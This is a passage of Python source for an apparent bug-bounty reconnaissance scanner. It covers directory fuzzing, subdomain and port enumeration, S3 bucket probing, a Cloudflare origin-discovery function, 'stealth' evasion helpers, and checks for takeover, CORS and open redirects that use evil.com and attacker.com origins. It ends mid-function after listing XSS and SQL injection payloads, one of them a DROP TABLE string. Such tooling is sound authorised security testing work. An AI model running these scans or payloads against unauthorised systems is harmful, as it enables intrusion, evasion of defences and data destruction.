    """Run ffuf for fast content/directory fuzzing. Returns list of
    {url, status, size, words, lines}. Skips when no wordlist is available."""
    import tempfile as _tf
    wl = wordlist or _ffuf_wordlist()
    if not wl:
        return None
    out_json = None
    try:
        fd, out_json = _tf.mkstemp(suffix=".json")
        os.close(fd)
        ok, out = run_pd("ffuf", ["-u", url.rstrip("/") + "/FUZZ", "-w", wl, "-mc", "200,201,204,301,302,307,401,403", "-t", "10", "-s", "-o", out_json] + stealth.pd_flags("ffuf"), timeout)
        if not ok:
            return None
        with open(out_json, "r", encoding="utf-8") as fh:
            j = json.load(fh)
        results = []
        for r in (j.get("results") or []):
            results.append({
                "url": r.get("url", ""),
                "status": r.get("status"),
                "size": r.get("length", ""),
                "words": r.get("words", ""),
                "lines": r.get("lines", ""),
            })
        return results
    except Exception:
        return None
    finally:
        if out_json:
            try: os.unlink(out_json)
            except Exception: pass

def pd_gobuster(url, wordlist=None, timeout=40):
    """Run gobuster dir for directory brute force. Returns list of
    {url, status, size}. Skips when no wordlist is available."""
    wl = wordlist or _ffuf_wordlist()
    if not wl:
        return None
    try:
        ok, out = run_pd("gobuster", ["dir", "-u", url.rstrip("/"), "-w", wl, "-t", "10", "-q", "-s", "200,204,301,302,307,401,403", "--no-error"], timeout)
    except Exception:
        return None
    if not ok or not out:
        return None
    results = []
    for line in out.strip().splitlines():
        m = re.match(r"(\S+)\s+\(Status:\s*(\d+)\)(?:\s+\[Size:\s*(\d+)\])?", line)
        if m:
            results.append({"url": m.group(1), "status": int(m.group(2)), "size": m.group(3) or ""})
    return results

_FFUF_WL = None
def _ffuf_wordlist():
    """Locate a usable wordlist for ffuf/gobuster (seclists or the harness's own)."""
    global _FFUF_WL
    if _FFUF_WL:
        return _FFUF_WL
    import glob as _glob
    candidates = [
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt",
        "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt",
        "/usr/share/wordlists/dirb/common.txt",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        "/opt/seclists/Discovery/Web-Content/common.txt",
    ]
    if globals().get("WORDLIST_DIR"):
        candidates.append(str(WORDLIST_DIR / "directories.txt"))
    for c in candidates:
        if c and os.path.isfile(c):
            _FFUF_WL = c
            return c
    for pat in ["/usr/share/**/common.txt", "/opt/**/Discovery/Web-Content/common.txt"]:
        for hit in _glob.glob(pat, recursive=True):
            if os.path.isfile(hit):
                _FFUF_WL = hit
                return hit
    return None

def pd_vulnx(service, timeout=15):
    """Run vulnx for CVE lookup by service name."""
    ok, out = run_pd("vulnx", ["-search", service, "-silent"], timeout)
    if not ok or not out: return None
    return out.strip()[:500]

# ─── RECON / UTILITY ────────────────────────────────────────────

def now():
    return datetime.now(timezone.utc).strftime("%H:%M:%S")

def clean_host(s):
    return (s or "").replace("https://","").replace("http://","").split("/")[0].split(":")[0]

def apex_domain(host):
    """Return the registrable (apex) domain for enumeration, e.g. www.postud.io -> postud.io."""
    host = clean_host(host).lower().strip(".")
    if not host:
        return host
    parts = host.split(".")
    # Treat common ccSLD combos (co.uk, com.au, co.nz, ...) as part of the apex.
    ccsld = {"uk", "au", "nz", "in", "jp", "br", "kr", "za", "id", "my", "sg", "hk", "de"}
    if len(parts) >= 3 and parts[-1] in ccsld and parts[-2] in ("co", "com", "ac", "gov", "org", "net", "edu", "govt"):
        return ".".join(parts[-3:])
    return ".".join(parts[-2:])

_dns_cache = {}
_dns_lock = threading.Lock()

def _resolve_host(host, timeout=4):
    """Resolve host -> IP with a hard timeout (getaddrinfo is not bounded by urllib's timeout)."""
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host) or ":" in host:
        return host
    key = host.lower()
    with _dns_lock:
        if key in _dns_cache:
            return _dns_cache[key]
    out = [None]
    def _look():
        try:
            out[0] = socket.getaddrinfo(host, None, socket.AF_INET, socket.SOCK_STREAM)[0][4][0]
        except Exception:
            out[0] = None
    t = threading.Thread(target=_look, daemon=True)
    t.start()
    t.join(timeout)
    result = out[0]
    with _dns_lock:
        _dns_cache[key] = result
    return result

class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def http_get(url, timeout=8, host_header=None, no_redirect=False, extra_headers=None):
    try:
        headers = stealth.headers()
        if extra_headers:
            headers.update(extra_headers)
        if host_header:
            headers["Host"] = host_header
        parsed = urllib.parse.urlparse(url)
        ip = _resolve_host(parsed.hostname, timeout=min(4, timeout))
        if ip is None:
            return 0, {}, ""
        if not host_header:
            headers["Host"] = parsed.netloc
        conn_url = urllib.parse.urlunparse(parsed._replace(netloc=ip + ((":" + str(parsed.port)) if parsed.port else "")))
        req = urllib.request.Request(conn_url, headers=headers)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if no_redirect:
            class _NoVerifyHTTPS(urllib.request.HTTPSHandler):
                def https_open(self, r):
                    return self.do_open(urllib.request.http.client.HTTPSConnection, r, context=ctx)
            opener = urllib.request.build_opener(_NoRedirect, _NoVerifyHTTPS())
            resp = opener.open(req, timeout=timeout)
        else:
            resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read().decode("utf-8", errors="ignore")
        return resp.status, dict(resp.headers), body
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), ""
    except Exception:
        return 0, {}, ""

def http_get_retry(url, timeout=8, host_header=None, no_redirect=False, extra_headers=None,
                   retries=2, backoff=1.5, jitter=1.0):
    """http_get with rate-limit-aware retry: exponential backoff + Retry-After
    honoring, so scans don't trip WAFs/rate limits or flood the target."""
    attempt = 0
    while True:
        status, headers, body = http_get(url, timeout=timeout, host_header=host_header,
                                         no_redirect=no_redirect, extra_headers=extra_headers)
        if status not in (429, 500, 502, 503, 504) or attempt >= retries:
            return status, headers, body
        delay = backoff * (jitter ** attempt)
        try:
            ra = int(headers.get("Retry-After", "0") or "0")
            if ra and 0 < ra <= 60:
                delay = ra
        except Exception:
            pass
        time.sleep(delay)
        attempt += 1

# ─── CVSS v3.1 SCORING ────────────────────────────────────────────

def cvss_base_score(vector):
    """Compute CVSS v3.1 base score from a vector string like
    CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N. Returns (score, rating)."""
    try:
        m = {}
        for part in vector.split("/"):
            if ":" in part:
                k, v = part.split(":", 1)
                m[k.upper()] = v.upper()
        av = {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.2}.get(m.get("AV", "N"), 0.85)
        ac = {"L": 0.77, "H": 0.44}.get(m.get("AC", "L"), 0.77)
        pr = {"N": 0.85, "L": 0.62, "H": 0.27}.get(m.get("PR", "N"), 0.85)
        ui = {"N": 0.85, "R": 0.62}.get(m.get("UI", "N"), 0.85)
        scope = m.get("S", "U")
        c = {"H": 0.56, "L": 0.22, "N": 0.0}.get(m.get("C", "H"), 0.56)
        i = {"H": 0.56, "L": 0.22, "N": 0.0}.get(m.get("I", "H"), 0.56)
        a = {"H": 0.56, "L": 0.22, "N": 0.0}.get(m.get("A", "H"), 0.56)
        iss = 1 - (1 - c) * (1 - i) * (1 - a)
        if scope == "U":
            impact = 6.42 * iss
        else:
            impact = 7.52 * (iss - 0.029) - 3.25 * (iss - 0.02) ** 15
        exploitability = 8.22 * av * ac * pr * ui
        if impact <= 0:
            score = 0.0
        elif scope == "U":
            score = min(impact + exploitability, 10.0)
        else:
            score = min(1.08 * (impact + exploitability), 10.0)
        score = round(math.ceil(score * 10) / 10, 1)
        if score >= 9.0: rating = "CRITICAL"
        elif score >= 7.0: rating = "HIGH"
        elif score >= 4.0: rating = "MEDIUM"
        elif score > 0.0: rating = "LOW"
        else: rating = "NONE"
        return score, rating
    except Exception:
        return 0.0, "NONE"

SEVERITY_CVSS = {
    "CRITICAL": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
    "HIGH": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
    "MEDIUM": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
    "LOW": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
    "INFO": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N",
}

def severity_cvss(severity):
    """Return (vector, score, rating) for a textual severity."""
    sev = str(severity or "INFO").upper()
    if sev not in SEVERITY_CVSS:
        sev = "INFO"
    vec = SEVERITY_CVSS[sev]
    score, rating = cvss_base_score(vec)
    return vec, score, rating

# ─── SUBDOMAIN DISCOVERY ────────────────────────────────────────

COMMON_SUBS = [
    "www","app","api","admin","dev","staging","test","mail","webmail","vpn","remote",
    "portal","crm","jira","confluence","wiki","gitlab","jenkins","ci","cd","monitor",
    "status","help","support","docs","kb","learn","university","academy","demo","try",
    "sandbox","uat","qa","stage","store","billing","pay","account","login","sso","auth",
    "okta","saml","mcp","ai","chat","bot","engage","connect","community","forum","blog",
    "news","insights","analytics","data","stats","cdn","static","assets","media","files",
    "uploads","s3","storage","backup","db","database","kibana","grafana","prometheus",
    "health","eu","us","eu1","us1","nyc","sfo","lon","fra","sgp","syd",
    "direct","origin","ftp","ns1","ns2","ns3","mx1","mx2","pop3","imap","smtp",
    "cpanel","whm","phpmyadmin","adminer","pma","webmin","netdata",
    "jenkins","sonar","nexus","artifactory","docker","k8s","kubernetes",
    "firewall","gateway","proxy","waf","lb","loadbalancer",
    "internal","private","corp","office","local","localhost",
    "vcenter","vmware","esxi","hyperv","xen","proxmox",
    "redis","mysql","mongo","postgres","mariadb","cockroach",
    "rabbitmq","kafka","zookeeper","consul","etcd","vault","nomad",
    "cloud","aws","gcp","azure","do","linode","digitalocean",
    "terraform","pulumi","ansible","chef","puppet","salt",
    "sentry","rollbar","datadog","newrelic","appdynamics","dynatrace",
    "segment","mparticle","amplitude","mixpanel","heap","hotjar",
    "hubspot","salesforce","zendesk","freshdesk","intercom","drift",
    "calendly","zoom","teams","slack","discord",
    "docs","developer","developers","devhub","api-docs","apidocs","swagger",
    "graphql","hasura","postgraphile","prisma","supabase",
    "adminer","pgadmin","phpmyadmin","adminer","cloud66","cloudways",
    "forums","community","chat","livechat","helpdesk","ticket",
    "bugs","issues","feedback","feature","roadmap","changelog",
    "partners","partner","reseller","affiliate","affiliates",
    "careers","jobs","apply","hr","benefits","culture",
    "investors","ir","investor","stock","shareholder",
]

def discover_subdomains(domain):
    """Find subdomains via crt.sh + wordlist (with concurrent DNS, capped at 20s)."""
    found = set()
    t0 = time.time()
    try:
        status, _, body = http_get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=12)
        if status == 200 and body:
            data = json.loads(body)
            for entry in data:
                for d in entry.get("name_value", "").split("\n"):
                    d = d.strip().lower()
                    if d.endswith(domain):
                        found.add(d)
    except: pass

    # If crt.sh gave enough results, skip wordlist DNS
    if len(found) >= 15:
        return sorted(found)

    # Resolve remaining wordlist subdomains concurrently (max 20s total)
    remaining = [s for s in COMMON_SUBS if f"{s}.{domain}" not in found][:80]
    if not remaining:
        return sorted(found)
    resolved = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        fut_map = {pool.submit(lambda s=s: (s, socket.getaddrinfo(f"{s}.{domain}", 80, socket.AF_INET, socket.SOCK_STREAM))): s for s in remaining}
        try:
            for f in concurrent.futures.as_completed(fut_map, timeout=8):
                try:
                    r = f.result()
                    if r and r[1]: resolved.append(r[0])
                except: pass
                if time.time() - t0 > 18: break
        except concurrent.futures.TimeoutError:
            pass
    for s in resolved:
        found.add(f"{s}.{domain}")
    return sorted(found)

# ─── HTTP PROBE ──────────────────────────────────────────────────

def probe_http(subdomains, domain):
    """Probe subdomains for HTTP responses."""
    results = {}
    targets = [domain] + [s for s in subdomains if s != domain]
    for target in targets[:25]:
        stealth.sleep()
        for proto in ["https://", "http://"]:
            url = f"{proto}{target}/"
            status, headers, body = http_get(url, timeout=5)
            if status > 0:
                server = headers.get("Server", headers.get("server", ""))
                title = ""
                m = re.search(r"<title>([^<]+)</title>", body, re.IGNORECASE)
                if m: title = m.group(1).strip()[:80]
                csp = headers.get("Content-Security-Policy", headers.get("content-security-policy", ""))
                tech = detect_tech(status, headers, body)
                results[url] = {
                    "status": status, "server": server, "title": title,
                    "tech": tech, "csp": csp[:200],
                    "cloudflare": "cloudflare" in server.lower() or any(k.lower() == "cf-ray" for k in headers),
                    "aws": "amazons3" in server.lower() or "cloudfront" in server.lower(),
                }
                break
    return results

def detect_tech(status, headers, body):
    techs = []
    s = headers.get("Server", "").lower()
    p = headers.get("X-Powered-By", "").lower()
    if "nginx" in s: techs.append("nginx")
    if "apache" in s: techs.append("apache")
    if "cloudflare" in s: techs.append("Cloudflare")
    if "amazons3" in s: techs.append("AWS S3")
    if "cloudfront" in s: techs.append("CloudFront")
    if "wordpress" in s or "wp-content" in body or "/wp-json" in body: techs.append("WordPress")
    if "next.js" in s or "__next" in body or "next-data" in body: techs.append("Next.js")
    if "sveltekit" in s or "x-sveltekit" in body: techs.append("SvelteKit")
    if "react" in body or "reactroot" in body or "__react" in body: techs.append("React")
    if "vite" in s or "vite" in body: techs.append("Vite")
    if "django" in s: techs.append("Django")
    if "flask" in s or "python" in s: techs.append("Python")
    if "express" in s or "node" in s: techs.append("Node.js")
    if "kinsta" in s: techs.append("Kinsta")
    if "vercel" in s or "x-vercel" in str(headers).lower(): techs.append("Vercel")
    if "zendesk" in s or "zendesk" in body: techs.append("Zendesk")
    return list(set(techs))

# ─── PORT SCAN ──────────────────────────────────────────────────

TOP_PORTS = [21,22,23,25,53,80,81,110,111,135,139,143,161,389,443,445,465,500,502,514,515,554,587,593,631,636,873,989,990,992,993,995,1080,1194,1352,1433,1434,1521,1723,2049,2082,2083,2086,2087,2095,2096,2181,2222,2375,2376,2443,2483,2484,3000,3001,3128,3306,3389,3690,4000,4001,4222,4433,4443,4444,4567,4646,4848,5000,5001,5002,5432,5555,5601,5631,5666,5800,5900,5901,5984,6000,6001,6379,6666,6667,7001,7002,7070,7071,7777,8000,8001,8008,8080,8081,8082,8086,8089,8090,8200,8222,8300,8443,8500,8530,8531,8545,8649,8761,8800,8888,8899,8983,9000,9001,9042,9090,9092,9100,9200,9300,9418,9999,10000,10001,10002,10080,11211,12345,15672,16379,17000,20000,27017,27018,32400,32768,37777,47808,49152,49153,49154,49155,50000,50070,50090,61616,61613]

def port_scan(domain, subdomains):
    """Scan top ports on discovered IPs (concurrent, max 30s)."""
    ips = set()
    for target in [domain] + list(subdomains):
        try:
            addrs = socket.getaddrinfo(target, 80, socket.AF_INET, socket.SOCK_STREAM)
            for a in addrs: ips.add(a[4][0])
        except: pass

    results = {}
    for ip in list(ips)[:5]:
        open_ports = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=stealth.workers("port")) as pool:
            def _sp(ip, p):
                try: socket.create_connection((ip, p), timeout=1.5).close(); return (p, True)
                except: return (p, False)
            fut_map = {pool.submit(_sp, ip, p): p for p in TOP_PORTS[:50]}
            try:
                for f in concurrent.futures.as_completed(fut_map, timeout=15):
                    try:
                        port_val, ok = f.result()
                        if ok: open_ports.append(port_val)
                    except: pass
            except concurrent.futures.TimeoutError:
                pass
        if open_ports:
            results[ip] = open_ports
    return results

# ─── CSP / S3 ANALYSIS ──────────────────────────────────────────

def analyze_csp(http_results):
    """Extract S3 buckets, internal URLs, and third-parties from CSP."""
    s3 = set(); internal = set(); third_party = set()
    for url, info in http_results.items():
        csp = info.get("csp", "")
        if not csp: continue
        for m in re.findall(r'https?://([a-zA-Z0-9._-]+\.s3[^/\s]*)\.amazonaws\.com', csp):
            s3.add(m)
        for u in re.findall(r'https?://[a-zA-Z0-9._/-]+', csp):
            domain = u.split("/")[2] if "://" in u else ""
            if not domain: continue
            if "amazonaws.com" in domain or "s3" in domain:
                s3.add(domain)
            elif "armorcode" in domain.lower() or domain.endswith((".com", ".io", ".co", ".app", ".dev", ".org", ".net")):
                if "google" not in domain and "facebook" not in domain and "cloudflare" not in domain and "github" not in domain:
                    internal.add(u)
            else:
                third_party.add(domain)
    return {"s3_buckets": sorted(s3), "internal_urls": sorted(internal), "third_party": sorted(third_party)}

# ─── S3 BUCKET PROBE ────────────────────────────────────────────

def probe_s3(buckets):
    results = {}
    regions = ["us-east-1","us-east-2","us-west-1","us-west-2","eu-central-1","eu-west-1","eu-west-2","ap-southeast-1","ap-northeast-1"]
    for bucket in buckets:
        name = bucket.split(".")[0]
        for region in regions:
            url = f"https://{name}.s3.{region}.amazonaws.com/"
            status, _, body = http_get(url, timeout=5)
            if status == 200:
                results[f"{name}/{region}"] = {"status": status, "public": True, "body": body[:200]}
                break
            elif status == 403:
                results[f"{name}/{region}"] = {"status": status, "public": False}
                break
    return results

# ─── CLOUDFLARE BYPASS ──────────────────────────────────────────

def cf_bypass(domain):
    origins = []
    try:
        status, _, body = http_get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=10)
        if status == 200 and body:
            for line in body.strip().split("\n"):
                parts = line.split(",")
                if len(parts) == 2:
                    origins.append({"subdomain": parts[0], "ip": parts[1]})
    except: pass
    return origins

# ─── BUG BOUNTY MODULES ─────────────────────────────────────────

WORDLIST_DIR = Path(DATA_DIR) / "wordlists"

def _load_wordlist(name):
    path = WORDLIST_DIR / name
    if not path.exists(): return []
    return [l.strip() for l in path.read_text(encoding="utf-8").splitlines() if l.strip() and not l.strip().startswith("#")]

def bb_wayback_machine(domain, timeout=15):
    """Fetch historical URLs from Wayback Machine CDX API."""
    try:
        url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original,statuscode,timestamp&limit=500"
        status, _, body = http_get(url, timeout=timeout)
        if status == 200 and body:
            data = json.loads(body)
            if len(data) > 1:
                urls = [entry[0] for entry in data[1:] if len(entry) >= 1]
                statuses = {}
                for entry in data[1:]:
                    if len(entry) >= 2 and entry[1].isdigit():
                        statuses[entry[0]] = int(entry[1])
                return {"urls": list(set(urls)), "statuses": statuses}
    except: pass
    return None

def bb_subdomain_bruteforce(domain, timeout=20):
    """Aggressive subdomain brute-force using wordlist."""
    wordlist = _load_wordlist("subdomains.txt")
    if not wordlist: return []
    found = []
    t0 = time.time()
    base = domain.lower()
    with concurrent.futures.ThreadPoolExecutor(max_workers=stealth.workers("subdomain")) as pool:
        def _check(sub):
            if time.time() - t0 > timeout: return None
            try:
                hostname = f"{sub}.{base}"
                socket.getaddrinfo(hostname, 80, socket.AF_INET, socket.SOCK_STREAM)
                return hostname
            except: return None
        fut_map = {pool.submit(_check, s): s for s in wordlist[:600]}
        try:
            for f in concurrent.futures.as_completed(fut_map, timeout=timeout):
                try:
                    r = f.result()
                    if r: found.append(r)
                except: pass
                if time.time() - t0 > timeout: break
        except concurrent.futures.TimeoutError:
            pass
    return sorted(set(found))

def bb_dirbust(targets, timeout=30, fp_probes=3):
    """Directory/file enumeration using wordlist against live URLs, with
    catch-all (soft-404 / SPA fallback / S3 default-deny) false-positive filtering.

    Returns (results, fp_stats). `results` only contains paths whose response
    signature differs from a random nonexistent-path baseline (i.e. real hits).
    """
    wordlist = _load_wordlist("directories.txt")
    if not wordlist or not targets: return {}, {}
    results = {}
    fp_stats = {"probed_targets": 0, "candidates": 0, "false_positives": 0, "real": 0, "by_target": {}}

    def _probe(base, path):
        url = base + "/" + path.lstrip("/")
        try:
            req = urllib.request.Request(url, headers=stealth.headers())
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            resp = urllib.request.urlopen(req, timeout=4, context=ctx)
            try:
                body = resp.read()
            except Exception:
                body = b""
            code, length, h = resp.status, len(body), hashlib.md5(body).hexdigest()
            resp.close()
            return (code, length, h)
        except urllib.error.HTTPError as e:
            try:
                body = e.read()
            except Exception:
                body = b""
            return (e.code, len(body), hashlib.md5(body).hexdigest())
        except Exception:
            return None

    for target in targets[:3]:
        base = target.rstrip("/")

        # Baseline: signature(s) of random nonexistent paths → catch-all behavior
        baseline = set()
        for _ in range(fp_probes):
            sig = _probe(base, "x-nonexistent-" + uuid.uuid4().hex[:12])
            if sig:
                baseline.add(sig)
            stealth.small_sleep()

        found = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=stealth.workers("dirbust")) as pool:
            def _check(path):
                sig = _probe(base, path)
                if not sig: return None
                code, length, h = sig
                if code in (200, 301, 302, 401, 403, 400, 500):
                    if sig in baseline:
                        return ("fp", path, code, length)
                    return ("real", path, code, length)
                return None
            fut_map = {pool.submit(_check, p): p for p in wordlist[:300]}
            try:
                for f in concurrent.futures.as_completed(fut_map, timeout=timeout):
                    try:
                        r = f.result()
                        if r: found.append(r)
                    except: pass
                    stealth.small_sleep()
            except concurrent.futures.TimeoutError: pass

        real = [(p, c, l) for tag, p, c, l in found if tag == "real"]
        fps = [(p, c, l) for tag, p, c, l in found if tag == "fp"]
        if real:
            results[target] = sorted(real, key=lambda x: x[0])
        fp_stats["probed_targets"] += 1
        fp_stats["candidates"] += len(found)
        fp_stats["false_positives"] += len(fps)
        fp_stats["real"] += len(real)
        fp_stats["by_target"][target] = {
            "candidates": len(found), "real": len(real),
            "false_positives": len(fps),
            "catchall_signature": sorted(baseline)[:3],
        }
    return results, fp_stats

def bb_tech_fingerprint_extended(headers, body):
    """Expanded tech detection — CMS, frameworks, CDNs, analytics."""
    techs = set()
    sh = {k.lower(): v.lower() for k, v in headers.items()}
    b = (body or "").lower()
    s = sh.get("server", "")
    p = sh.get("x-powered-by", "")

    # Servers
    if "nginx" in s: techs.add("nginx")
    if "apache" in s: techs.add("Apache")
    if "iis" in s or "microsoft-iis" in s: techs.add("IIS")
    if "caddy" in s: techs.add("Caddy")
    if "traefik" in s: techs.add("Traefik")
    if "envoy" in s: techs.add("Envoy")
    if "openresty" in s: techs.add("OpenResty")

    # CDN / Reverse Proxy
    if "cloudflare" in s: techs.add("Cloudflare")
    if "cloudfront" in s or "x-amz-cf" in str(headers): techs.add("CloudFront")
    if "fastly" in s: techs.add("Fastly")
    if "akamai" in s or "x-akamai" in str(headers): techs.add("Akamai")
    if "sucuri" in s: techs.add("Sucuri")
    if "incapsula" in s: techs.add("Incapsula")
    if "stackpath" in s: techs.add("StackPath")
    if "keycdn" in s: techs.add("KeyCDN")

    # CMS
    if "wp-content" in b or "/wp-json" in b or "wp-includes" in b: techs.add("WordPress")
    if "joomla" in b or "com_content" in b: techs.add("Joomla")
    if "drupal" in b or "drupal.js" in b: techs.add("Drupal")
    if "magento" in b or "mage-cache" in str(headers): techs.add("Magento")
    if "shopify" in s or "shopify" in b or "x-shopify" in str(headers): techs.add("Shopify")
    if "squarespace" in s: techs.add("Squarespace")
    if "wix" in b or "wix" in s: techs.add("Wix")
    if "ghost" in b and "ghost" in str(headers): techs.add("Ghost")

    # JavaScript Frameworks
    if "__next" in b or "next-data" in b or "_next/static" in b: techs.add("Next.js")
    if "__nuxt" in b or "_nuxt" in b: techs.add("Nuxt.js")
    if "reactroot" in b or "__react" in b or "react" in b: techs.add("React")
    if "vue" in b and ("__vue" in b or "vue" in b): techs.add("Vue.js")
    if "angular" in b or "ng-app" in b or "ng-version" in b: techs.add("Angular")
    if "svelte" in b or "x-sveltekit" in str(headers): techs.add("Svelte")
    if "gatsby" in b or "__gatsby" in b: techs.add("Gatsby")
    if "remix" in b: techs.add("Remix")

    # Backend
    if "django" in s or "csrftoken" in b or "__django" in b: techs.add("Django")
    if "flask" in s or "flask" in p: techs.add("Flask")
    if "python" in s or "python" in p: techs.add("Python")
    if "express" in s or "node" in s: techs.add("Node.js/Express")
    if "rails" in s or "rails" in p: techs.add("Ruby on Rails")
    if "laravel" in s or "laravel_session" in b: techs.add("Laravel")
    if "symfony" in s or "symfony" in b: techs.add("Symfony")
    if "spring" in s or "java" in s: techs.add("Spring/Java")
    if "asp.net" in s or "asp.net" in p: techs.add("ASP.NET")
    if "go" in s or "golang" in s: techs.add("Go")
    if "vertx" in s: techs.add("Vert.x")
    if "tomcat" in s: techs.add("Tomcat")
    if "jetty" in s: techs.add("Jetty")
    if "wildfly" in s: techs.add("WildFly")

    # Deploy / Hosting
    if "vercel" in s or "x-vercel" in str(headers).lower(): techs.add("Vercel")
    if "netlify" in s or "x-nf-request-id" in str(headers): techs.add("Netlify")
    if "heroku" in s or "x-heroku" in str(headers): techs.add("Heroku")
    if "github" in s or "github" in b: techs.add("GitHub Pages")
    if "gitlab" in s: techs.add("GitLab Pages")
    if "kinsta" in s: techs.add("Kinsta")

    # Analytics / Monitoring
    if "google-analytics" in b or "ga.js" in b or "gtag" in b: techs.add("Google Analytics")
    if "hotjar" in b: techs.add("Hotjar")
    if "mixpanel" in b: techs.add("Mixpanel")
    if "amplitude" in b: techs.add("Amplitude")
    if "segment" in b or "analytics.js" in b: techs.add("Segment")
    if "fullstory" in b: techs.add("FullStory")
    if "intercom" in b: techs.add("Intercom")
    if "drift" in b: techs.add("Drift")
    if "crisp" in b: techs.add("Crisp Chat")
    if "tawk" in b: techs.add("Tawk.to")
    if "zendesk" in b or "zopim" in b: techs.add("Zendesk")
    if "hubspot" in b or "hs-analytics" in b: techs.add("HubSpot")

    # Security
    if "cloudflare" in s: techs.add("Cloudflare WAF")
    if "x-frame-options" in sh: techs.add("Has XFO")
    if "content-security-policy" in sh: techs.add("Has CSP")
    if "strict-transport-security" in sh: techs.add("Has HSTS")
    if "x-content-type-options" in sh: techs.add("Has XCTO")

    return sorted(techs)

def bb_takeover_check(subdomains, domain, timeout=15):
    """Check subdomains for potential takeover (dangling CNAMEs)."""
    findings = []
    takeover_services = {
        "s3-website": ["amazonaws.com", "s3.amazonaws.com", "s3-website"],
        "cloudfront": ["cloudfront.net"],
        "github": ["github.io"],
        "heroku": ["herokuapp.com", "herokudns.com"],
        "netlify": ["netlify.com", "netlify.app"],
        "vercel": ["vercel.app", "vercel.com", "now.sh"],
        "azure": ["azureedge.net", "azurewebsites.net", "trafficmanager.net"],
        "pantheon": ["pantheonsite.io"],
        "wordpress": ["wordpress.com"],
        "zendesk": ["zendesk.com"],
        "freshdesk": ["freshdesk.com"],
        "statuspage": ["statuspage.io"],
        "atlassian": ["atlassian.net", "jira.com"],
        "bitbucket": ["bitbucket.io"],
        "surge": ["surge.sh"],
        "readme": ["readme.io"],
        "unbounce": ["unbouncepages.com"],
        "cargo": ["cargocollective.com"],
        "fly": ["fly.dev"],
        "render": ["onrender.com"],
        "tumblr": ["tumblr.com"],
        "shorthand": ["shorthand.com"],
        "helpjuice": ["helpjuice.com"],
        "helpscout": ["helpscout.net"],
        "ghost": ["ghost.io"],
    }
    target_subs = [s for s in subdomains[:50]]
    target_subs.insert(0, domain)
    for sub in target_subs:
        try:
            result = subprocess.run(["nslookup", sub], capture_output=True, text=True, timeout=5)
            out = result.stdout.lower()
            for svc, domains in takeover_services.items():
                for d in domains:
                    if d in out and "nxdomain" not in out and "no answer" not in out:
                        # Check if CNAME points to unclaimed service — look for NXDOMAIN on target
                        escaped_d = d.replace('.', '\\.')
                        cname_match = re.search(rf"(canonical name = )?(\S+\.{escaped_d})", out)
                        if cname_match:
                            cname_target = cname_match.group(2) if cname_match.lastindex >= 2 else cname_match.group(0)
                            try:
                                socket.getaddrinfo(cname_target, 80, socket.AF_INET, socket.SOCK_STREAM)
                            except:
                                findings.append({"subdomain": sub, "service": svc, "cname": cname_target, "vulnerable": True})
        except: pass
    return findings

def bb_cors_check(urls, timeout=15):
    """Check for CORS misconfigurations on target URLs."""
    findings = []
    test_origins = ["https://evil.com", "null", "https://attacker.com"]
    for url in urls[:5]:
        for origin in test_origins:
            try:
                req = urllib.request.Request(url, headers={"Origin": origin, **stealth.headers()})
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                resp = urllib.request.urlopen(req, timeout=5, context=ctx)
                aco = resp.headers.get("Access-Control-Allow-Origin", "")
                acc = resp.headers.get("Access-Control-Allow-Credentials", "")
                if aco == "*":
                    findings.append({"url": url, "origin": origin, "issue": "wildcard_origin", "severity": "medium"})
                elif aco == origin:
                    issues = ["reflective_origin"]
                    if acc.lower() == "true":
                        issues.append("with_credentials")
                    findings.append({"url": url, "origin": origin, "issue": "_".join(issues), "severity": "high" if "credentials" in issues else "medium"})
                resp.close()
            except: pass
    return findings

def bb_open_redirect_check(urls, timeout=15):
    """Basic open redirect detection."""
    findings = []
    test_params = ["url", "next", "redirect", "return", "return_to", "return_url", "redirect_to", "redirect_url", "dest", "destination", "target", "out", "view", "dir", "to", "goto", "link", "r", "u", "ref"]
    for url in urls[:5]:
        base = url.split("?")[0]
        for param in test_params[:5]:
            test_url = f"{base}?{param}=https://evil.com/check"
            try:
                req = urllib.request.Request(test_url, headers=stealth.headers())
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                resp = urllib.request.urlopen(req, timeout=4, context=ctx)
                if resp.status in (301, 302):
                    loc = resp.geturl()
                    if "evil" in loc.lower():
                        findings.append({"url": test_url, "redirects_to": loc, "severity": "medium"})
                resp.close()
            except urllib.error.HTTPError as e:
                loc = e.headers.get("Location", "")
                if "evil" in loc.lower():
                    findings.append({"url": test_url, "redirects_to": loc, "severity": "medium"})
            except: pass
    return findings

def bb_injection_scan(urls, timeout=20):
    """Basic injection point detection (XSS, SQLi, SSTI) via pattern matching."""
    findings = []
    xss_payloads = ['"><script>alert(1)</script>', "'-alert(1)-'", "<img/src=x onerror=alert(1)>"]
    sqli_payloads = ["'", "1' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--"]
    for url in urls[:3]:
        if "?" in url:
